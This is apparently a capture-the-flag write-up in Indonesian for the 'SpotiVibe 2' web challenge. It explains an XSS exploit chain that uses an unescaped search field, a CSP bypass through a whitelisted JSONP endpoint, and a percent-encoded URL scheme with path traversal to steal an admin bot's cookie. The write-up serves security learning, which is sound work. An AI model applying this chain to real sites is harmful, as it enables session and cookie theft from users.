# SpotiVibe 2 - Writeup (Web Misc)

## Informasi Challenge
- Nama: SpotiVibe 2
- Kategori: Web Misc
- Target: `http://chall.k1nd4sus.it:30503`

## Ringkasan Kerentanan
Challenge ini kelihatan seperti patch dari SpotiVibe 1, tapi masih bisa di-chain lewat 3 bug:

1. **XSS di dashboard**
   - Di `dashboard.html` ada `{{ search | safe }}`.
   - Artinya input `search` dirender tanpa escaping.

2. **CSP bypass lewat whitelisted domain**
   - CSP dashboard hanya mengizinkan script dari `self` + `https://www.w3schools.com` + nonce.
   - Tapi ada endpoint JSONP yang masih aktif:
     - `https://www.w3schools.com/js/demo_jsonp2.php?callback=...`
   - Ini memungkinkan eksekusi JS attacker tanpa nonce.

3. **URL parser mismatch di validasi spotify_url**
   - Server validasi `spotify_url` dengan:
     - `decoded = unquote(url)`
     - `urlparse(decoded)`
     - host harus `open.spotify.com`
     - path harus `/embed/...`
   - Payload pakai `%68%74%74%70://...` (`http://` dalam bentuk encoded).
   - Server melakukan `unquote` dulu, jadi menganggap ini URL valid ke Spotify.
   - Browser **tidak** decode bagian encoded itu sebagai scheme saat set `iframe src`, jadi dianggap path relatif di origin challenge.

## Intuisi Exploit
Tujuan kita: memaksa bot admin (yang visit `/song/<id>`) agar iframe malah membuka:

`/dashboard?search=<xss_payload>`

Biar XSS jalan di konteks admin, baca `document.cookie` (yang berisi `flag=KSUS{...}`), lalu simpan hasil ke akun attacker sendiri via `POST /add_song`.

Trik URL yang dipakai:

`%68%74%74%70://open.spotify.com/embed/../../../../../dashboard?search=<payload>`

Kenapa `../../../../../`?
- Karena iframe dimuat dari halaman `/song/<id>`.
- Dengan traversal yang cukup, path akhirnya normalisasi ke `/dashboard`.

## Langkah Exploit
1. Register + login akun attacker.
2. Tambah lagu berisi `spotify_url` payload di atas.
3. `search` diisi `<script src='https://www.w3schools.com/js/demo_jsonp2.php?callback=...'></script>`.
4. Report song id ke bot admin.
5. Saat bot buka `/song/<id>`:
   - iframe resolve ke `/dashboard?search=...`
   - XSS jalan (via JSONP W3Schools)
   - JS payload melakukan:
     - `fetch('/logout')`
     - login ulang sebagai attacker
     - `POST /add_song` dengan `title=document.cookie`
6. Poll `/dashboard` attacker sampai `KSUS{...}` muncul di judul lagu.

## Flag
`KSUS{61592b2c5b7175ebe1da5f799285a3b3}`

## Solver
File: `solver.py`

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
python3 solver.py
```

Output sukses:

```text
<FLAG>KSUS{...}</FLAG>
```

## Catatan Praktis
- Kadang bot antre, jadi kalau belum dapat di percobaan pertama, jalankan lagi.
- Solver yang dipakai di sini adalah versi direct final chain (tanpa brute-force kandidat URL banyak).
